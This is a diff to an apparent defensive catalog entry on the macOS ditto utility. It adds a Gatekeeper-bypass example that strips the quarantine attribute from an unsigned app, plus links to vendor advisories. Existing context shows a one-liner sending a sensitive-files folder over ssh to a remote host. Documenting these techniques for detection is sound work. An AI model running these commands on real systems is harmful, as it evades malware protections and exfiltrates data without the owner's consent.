@@ -14,6 +14,18 @@ example_use_cases:
   - files
   - compress
   - recursive
+- name: Remove extended attributes from a file
+  description: ditto can be used to bypass Gatekeeper by removing the "com.apple.quarantine" extended attribute.
+  code: >-
+    ditto -c -k unsigned.app app.zip
+    ditto -x -k app.zip unsigned.app 2>/dev/null
+  tactics:
+  - Collection
+  - Exfiltration
+  tags:
+  - files
+  - compress
+  - recursive
 - name: Copy, compress, and transfer sensitive data to a remote macOS host
   description: The following command gathers and compresses (-c) files from the specified folder and writes them to a zip (-k) file.
   code: ditto -c --norsrc /home/user/sensitive-files - | ssh remote_host ditto -x --norsrc - /home/user/l00t
@@ -38,3 +50,7 @@ detections:
 resources:
 - name: ditto man page
   url: https://ss64.com/osx/ditto.html
+- name: "Gatekeeper’s Achilles heel: Unearthing a macOS vulnerability"
+  url: https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/
+- name: Jamf Threat Labs identifies Safari vulnerability allowing for Gatekeeper bypass
+  url: https://www.jamf.com/blog/jamf-threat-labs-safari-vuln-gatekeeper-bypass/
